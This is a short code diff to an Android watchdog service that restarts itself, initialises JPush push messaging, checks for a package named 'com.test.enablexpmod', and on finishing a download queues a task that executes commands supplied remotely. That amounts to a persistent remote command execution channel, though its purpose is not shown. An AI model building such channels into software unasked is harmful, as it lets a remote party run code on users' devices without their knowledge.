@@ -120,6 +120,9 @@ public class DaemonWatchDogService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        //        setlogger
+        Logger.init().methodCount(0).hideThreadInfo();
+
         //            start jpush
         JPushInterface.setDebugMode(true);
         JPushInterface.init(this);
@@ -135,6 +138,19 @@ public class DaemonWatchDogService extends Service {
                 Logger.d("I'm WatchDogService  receive msg " + stringExtra);
             }
         }
+
+        boolean watchdogInstalled = Utils.isAppInstalled(this, "com.test.enablexpmod");
+        if (!watchdogInstalled) {
+            ThreadPool threadPool = ThreadPool.getThreadPool();
+            threadPool.addTask(new Task(threadPool, null));
+            Logger.d("daemonInstalled false  --  testtask outoftime");
+        } else {
+            //       绑定远程服务
+            bindRemoteService();
+            Logger.d("daemonInstalled bindRemoteService");
+        }
+
+
         return START_STICKY;
     }
 
@@ -200,7 +216,8 @@ public class DaemonWatchDogService extends Service {
                 @Override
                 public void onFinish(DownloadTask downloadTask) {
                     Logger.d("onFinish");
-                    ThreadPool.getThreadPool().addTask(new Task(cmdBean.getCmds()));
+                    ThreadPool threadPool = ThreadPool.getThreadPool();
+                    threadPool.addTask(new Task(threadPool,cmdBean.getCmds()));
                 }
 
                 @Override
